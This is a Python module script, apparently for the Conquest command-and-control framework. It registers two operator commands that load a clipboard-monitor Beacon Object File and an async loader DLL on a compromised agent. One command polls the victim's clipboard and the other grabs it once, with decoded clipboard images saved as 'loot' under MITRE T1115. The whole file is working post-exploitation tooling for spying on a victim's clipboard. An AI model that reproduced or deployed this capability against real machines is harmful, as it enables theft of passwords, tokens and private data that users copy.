import conquest
import os.path 
import base64, time

SCRIPT_DIR = os.path.dirname(__file__)
    
cmd_clipboardMonitor = (
    conquest.createCommand(name="clipboard-monitor", description="Monitor and output clipboard changes to the agent console (async).", example="clipboard-monitor --interval 2", 
                        message="Tasked agent to monitor for clipboard changes.", mitre=["T1115"])
            .addFlagInt("--interval", "interval", "Polling interval in seconds (default: 5).", False, 5)
            .setHandler(lambda agentId, cmdline, args: (
                interval := conquest.get_int(args, 0),

                bof := os.path.join(SCRIPT_DIR, f"clipboard-monitor.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("ii", [
                    1,           # i: Monitor/Async mode
                    interval,    # i: Polling interval in seconds
                ]),

                dll := conquest.resources_root() + f"/async-bof-loader/dist/async-bof.{conquest.arch(agentId)}.dll",
                conquest.execute_alias(agentId, cmdline, f"dll {dll} Run {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof) and os.path.exists(dll)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline) if not os.path.exists(bof)
                else conquest.error(agentId, f"Async BOF DLL not found: {dll}", cmdline)
            ))
).registerToGroup("situational awareness")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def _getClipboardOutput(agentId, output):
      conquest.output(agentId, output)

      prefix = "[+] Encoded Image: "
      if prefix not in output:
          return
      raw = output[output.index(prefix) + len(prefix):].strip()

      try:
          filename = f"clipboard_{int(time.time())}.bmp"
          conquest.add_screenshot(agentId, filename, base64.b64decode(raw), "Source: clipboard-monitor BOF")
          conquest.success(agentId, f"Clipboard image stored in loot: {filename}")
      
      except Exception as e:
          conquest.error(agentId, f"Failed to store clipboard image: {e}", "")

cmd_getClipboard = (
    conquest.createCommand(name="get-clipboard", description="Retrieve clipboard contents.", example="get-clipboard", 
                        message="Tasked agent to retrieve clipboard contents.", mitre=["T1115"])
            .setHandler(lambda agentId, cmdline, args: (
                bof := os.path.join(SCRIPT_DIR, f"clipboard-monitor.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("ii", [
                    0,     # i: One-time request/Sync mode
                    0,     # i: Polling interval, not used in sync mode
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
            .setOutputHandler(_getClipboardOutput) 
    ).registerToGroup("situational awareness")